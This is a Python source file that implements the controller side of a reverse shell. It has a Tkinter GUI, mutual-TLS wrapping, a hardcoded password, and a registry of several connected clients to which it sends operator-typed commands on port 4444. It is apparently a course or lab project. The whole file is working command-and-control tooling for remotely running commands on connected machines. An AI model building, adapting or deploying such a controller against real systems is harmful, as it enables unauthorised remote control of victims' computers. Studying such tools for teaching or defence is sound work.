#!/usr/bin/env python3

# Step 1: Creating a socket
# Step 2: Binding the socket and listening
# Step 3: Accepting connection
# Step 4: Sending command to the client
# Step 5: Client to server connection
# Step 6: Completing the client file

"""
Reverse Shell Server with a GUI Interface
-------------------------------------------
This server listens for an incoming reverse connection and provides a simple
GUI (using Tkinter) to send commands and display output.
Includes password-based authentication, TLS connection and multi-client suport.
"""
import sys
import ssl
import socket
import threading
import tkinter as tk
from tkinter import scrolledtext

# Configuration server
HOST = '0.0.0.0'    # Listen on all available interfaces
PORT = 4444  # Port for incoming connections

CLIENT_NUM = 5 # Maximum number of clients we want to listen for

# Authentication configuration
# In a production environment, this should be securely stored (not hardcoded)
PASSWORD = "2025@UPC"  # We can change this password for a stronger one

def create_server_context(ca_file, cert_file, key_file):
    """
    - Purpose.CLIENT_AUTH enforces client certs.
    - load_cert_chain supplies our server’s cert+key.
    - load_verify_locations trusts only our CA.
    - verify_mode=CERT_REQUIRED turns on mutual-TLS.
    """
    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
    ctx.load_verify_locations(cafile=ca_file)                  
    ctx.verify_mode = ssl.CERT_REQUIRED

    return ctx

class ReverseShellGUI:
    def __init__(self, master):
        self.master = master
        master.title("Reverse Shell Controller")

        # A scrollable text area to display output from the client
        self.output_area = scrolledtext.ScrolledText(master, wrap=tk.WORD, width=80, height=20)
        self.output_area.pack(padx=10, pady=10)

        # An entry widget to type commands
        self.entry = tk.Entry(master, width=80)
        self.entry.pack(padx=10, pady=(0,10))
        # Bind the "Enter" key to send commands
        self.entry.bind("<Return>", self.send_command)

        # A button to send commands
        self.send_button = tk.Button(master, text="Send", command=self.send_command)
        self.send_button.pack(pady=(0,10))

        # Create server socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((HOST, PORT))
        self.server_socket.listen(CLIENT_NUM)
        self.write_output(f"[*] Listening on {HOST}:{PORT} (TLS)\n")


        # 1) Client registry for multiple connections
        self.clients = {}       # client_id -> (ssl_conn, addr)
        self.next_client_id = 1

        # 2) GUI widget to select active client
        import tkinter.ttk as ttk
        self.client_selector = ttk.Combobox(master, values=[], state='readonly')
        self.client_selector.pack(pady=(0,10))
        self.client_selector.set("No client")

        # Build and store TLS context
        self.tls_ctx = create_server_context(
            ca_file   = "certs/ca.crt",
            cert_file = "certs/server.crt",
            key_file  = "certs/server.key"
        )

        threading.Thread(target=self.accept_loop, daemon=True).start()

    def accept_loop(self):
        """
        Continuously accept new connections and spawn handler threads.
        """
        while True:
            raw_conn, addr = self.server_socket.accept()
            threading.Thread(
                target=self.handle_client,
                args=(raw_conn, addr),
                daemon=True
            ).start()

    def handle_client(self, raw_conn, addr):
        """
        Wrap in TLS, authenticate, register client, then relay I/O.
        """
        # TLS Handshake
        try:
            conn = self.tls_ctx.wrap_socket(raw_conn, server_side=True)    # 
            self.write_output(f"[*] TLS handshake with {addr}\n")
        except ssl.SSLError as e:
            self.write_output(f"[!] TLS handshake error from {addr}: {e}\n")
            raw_conn.close()
            return

        # Password Auth
        if not self.authenticate_client(conn):
            conn.close()
            return

        # Register client
        client_id = self.next_client_id
        self.next_client_id += 1
        self.clients[client_id] = (conn, addr)
        self.write_output(f"[*] Client {client_id} authenticated: {addr}\n")
        self.update_client_selector()

        # Receive loop
        try:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                self.write_output(f"[{client_id}] {data.decode(errors='ignore')}")
        except Exception as e:
            self.write_output(f"[!] Error with client {client_id}: {e}\n")
        finally:
            conn.close()
            del self.clients[client_id]
            self.write_output(f"[*] Client {client_id} disconnected\n")
            self.update_client_selector()

    def update_client_selector(self):
        """
        Update the GUI dropdown of available client IDs.
        """
        client_ids = list(self.clients.keys())
        self.client_selector['values'] = client_ids
        if client_ids:
            self.client_selector.set(client_ids[-1])
        else:
            self.client_selector.set("No client")


    def write_output(self, message):
        """
        Insert a message into the output area and auto-scroll to the end.
        """
        self.output_area.insert(tk.END, message)
        self.output_area.see(tk.END)

    def authenticate_client(self, conn):
        """
        Authenticate the client using a password
        """
        try:
            # Wait to receive the password from client
            client_password = conn.recv(1024).decode('utf-8')
            
            # Compare with the stored password
            if client_password == PASSWORD:
                conn.send("AUTH_SUCCESS".encode('utf-8'))
                self.write_output("[*] Client authenticated successfully\n")
                return True
            else:
                conn.send("AUTH_FAILED".encode('utf-8'))
                self.write_output("[!] Client authentication failed\n")
                return False
        except Exception as e:
            self.write_output(f"[!] Authentication error: {e}\n")
            return False

    def send_command(self, event=None):
        """
        Send a command to the connected client.
        """
        # Look up the selected client ID from the dropdown
        try:
            client_id = int(self.client_selector.get())
            conn, addr = self.clients[client_id]
        except (ValueError, KeyError):
            self.write_output("[!] No valid client selected\n")
            return

        cmd = self.entry.get().strip()
        if not cmd:
            return

        # Send to the correct client socket
        try:
            conn.send(cmd.encode('utf-8'))
            self.write_output(f"\n[>] (Client {client_id}) {cmd}\n")
        except Exception as e:
            self.write_output(f"[!] Failed to send to client {client_id}: {e}\n")
        finally:
            self.entry.delete(0, tk.END)

if __name__ == '__main__':
    root = tk.Tk()
    gui = ReverseShellGUI(root)
    root.mainloop()
    
